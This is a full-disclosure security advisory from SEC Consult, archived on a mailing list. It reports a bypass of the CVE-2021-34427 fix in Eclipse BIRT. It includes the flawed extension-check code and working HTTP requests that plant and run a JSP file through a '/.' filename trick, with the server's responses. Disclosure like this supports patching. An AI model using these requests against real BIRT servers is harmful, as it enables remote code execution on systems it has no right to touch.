---
title: SEC Consult SA-20221216-0 :: Remote code execution bypass in Eclipse Business Intelligence Reporting Tool (BiRT)
url: https://seclists.org/fulldisclosure/2022/Dec/30
source: Full Disclosure
date: 2022-12-22
fetch_date: 2025-10-04T02:14:58.143958
---

# SEC Consult SA-20221216-0 :: Remote code execution bypass in Eclipse Business Intelligence Reporting Tool (BiRT)

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](29)
[By Date](date.html#30)
[![Next](/images/right-icon-16x16.png)](31)

[![Previous](/images/left-icon-16x16.png)](29)
[By Thread](index.html#30)
[![Next](/images/right-icon-16x16.png)](31)

![](/shared/images/nst-icons.svg#search)

# SEC Consult SA-20221216-0 :: Remote code execution bypass in Eclipse Business Intelligence Reporting Tool (BiRT)

---

*From*: "SEC Consult Vulnerability Lab, Research via Fulldisclosure" <fulldisclosure () seclists org>
*Date*: Fri, 16 Dec 2022 07:26:13 +0000

---

```
SEC Consult Vulnerability Lab Security Advisory < 20221216-0 >
=======================================================================
               title: Remote code execution - CVE-2021-34427 bypass
             product: Eclipse Business Intelligence Reporting Tool (BiRT)
  vulnerable version: <= 4.11.0
       fixed version: 4.12
          CVE number: CVE-2021-34427
              impact: High
            homepage: https://eclipse.github.io/birt-website/
               found: 2022-10-05
                  by: Armin Stock (Atos)
                      SEC Consult Vulnerability Lab

                      An integrated part of SEC Consult, an Atos company
                      Europe | Asia | North America

                      https://www.sec-consult.com

=======================================================================

Vendor description:
-------------------
"With BIRT you can create data visualizations, dashboards and reports
that can be embedded into web applications and rich clients. Make information out
of your data!"

https://eclipse.github.io/birt-website/

Business recommendation:
------------------------
The vendor provides a patch which should be installed immediately.

Vulnerability overview/description:
-----------------------------------
1) Remote code execution - CVE-2021-34427 bypass
The vulnerability described in CVE-2021-34427 (https://www.cvedetails.com/cve/CVE-2021-34427/)
allows an attacker to execute code on the server, by creating a `.jsp` file
with the `BiRT - WebViewerExample`. This was fixed with the following code:

-------------------------------------------------------------------------------
//
viewer/org.eclipse.birt.report.viewer/birt/WEB-INF/classes/org/eclipse/birt/report/context/ViewerAttributeBean.java#L1081
        protected static void checkExtensionAllowedForRPTDocument(String rptDocumentName) throws ViewerException {
                int extIndex = rptDocumentName.lastIndexOf(".");
                String extension = null;
                boolean validExtension = true;

                if (extIndex > -1 && (extIndex + 1) < rptDocumentName.length()) {
                        extension = rptDocumentName.substring(extIndex + 1);

                        if (!disallowedExtensionsForRptDocument.isEmpty()
                                        && disallowedExtensionsForRptDocument.contains(extension)) {
                                validExtension = false;
                        }

                        if (!allowedExtensionsForRptDocument.isEmpty() &&
!allowedExtensionsForRptDocument.contains(extension)) {
                                validExtension = false;
                        }

                        if (!validExtension) {
                                throw new ViewerException(BirtResources.getMessage(
                                                ResourceConstants.ERROR_INVALID_EXTENSION_FOR_DOCUMENT_PARAMETER, new
String[] { extension }));
                        }

                }
        }
-------------------------------------------------------------------------------

This fix can be easily bypassed by adding `/.` to the filename which allows
an attacker to execute arbitrary code.

Proof of concept:
-----------------
1) Remote code execution - CVE-2021-34427 bypass
The old exploit results in an error message:

-------------------------------------------------------------------------------
GET /birt/document?__report=test.rptdesign&sample=<@urlencode_all><%  out.println("OS: " +
System.getProperty("os.name"));  out.println("Current dir: " +
getServletContext().getRealPath("/"));%><@/urlencode_all>&__document=<@urlencode>./test/info-new.jsp<@/urlencode>
HTTP/1.1
Host: IP:18080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.8,de-DE;q=0.5,de;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Cookie: JSESSIONID=C2A5FE509AD277742111569F8656881A
Upgrade-Insecure-Requests: 1
-------------------------------------------------------------------------------

Response:
-------------------------------------------------------------------------------
HTTP/1.1 200
Set-Cookie: JSESSIONID=A1E37E7FEC80DFFF155CAF9F642ADEB7; Path=/birt; HttpOnly
Content-Type: text/html;charset=utf-8
Date: Wed, 05 Oct 2022 06:14:54 GMT
Connection: close
Content-Length: 4644

<html>
<head>
<title>Error</title>
<META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=utf-8"/>
</head>
<body>
<div id="birt_errorPage" style="color:red">
<span id="error_icon"  style="cursor:pointer" onclick="if (document.getElementById('error_detail').style.display ==
'none') { document.getElementById('error_icon').innerHTML = '- ';
document.getElementById('error_detail').style.display = 'block'; }else {
document.getElementById('error_icon').innerHTML = '+ '; document.getElementById('error_detail').style.display = 'none';
}" > +
</span>

Invalid extension - "jsp" for the __document parameter.
-------------------------------------------------------------------------------

But adding `/.` to the end of the filename creates the file on the server as
before:

-------------------------------------------------------------------------------
GET /birt/document?__report=test.rptdesign&sample=<@urlencode_all><%  out.println("OS: " +
System.getProperty("os.name"));  out.println("Current dir: " +
getServletContext().getRealPath("/"));%><@/urlencode_all>&__document=<@urlencode>./test/info-new.jsp/.<@/urlencode>
HTTP/1.1
Host: IP:18080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.8,de-DE;q=0.5,de;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Cookie: JSESSIONID=C2A5FE509AD277742111569F8656881A
Upgrade-Insecure-Requests: 1

-------------------------------------------------------------------------------

-------------------------------------------------------------------------------
HTTP/1.1 200
Set-Cookie: JSESSIONID=5CC070E6E07D94816BF67A162E7DD8D2; Path=/birt; HttpOnly
Content-Type: text/html;charset=utf-8
Date: Wed, 05 Oct 2022 05:26:01 GMT
Connection: close
Content-Length: 283

<html><head><title>Complete</title><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=utf-8"></head>
<body style="background-color: #ECE9D8;">
<div style="font-size:10pt;"><font color="black">
The report document file has been generated successfully.</font>
</div></body></html>
-------------------------------------------------------------------------------

This allows the execution of the provided `JSP` code, by calling
`/birt/test/info-new.jsp`.

Vulnerable / tested versions:
-----------------------------
The following version has been tested, but all versions <= 4.11 are vulnerable.
* 4.10.0 (2022-10-01)

Vendor contact timeline:
------------...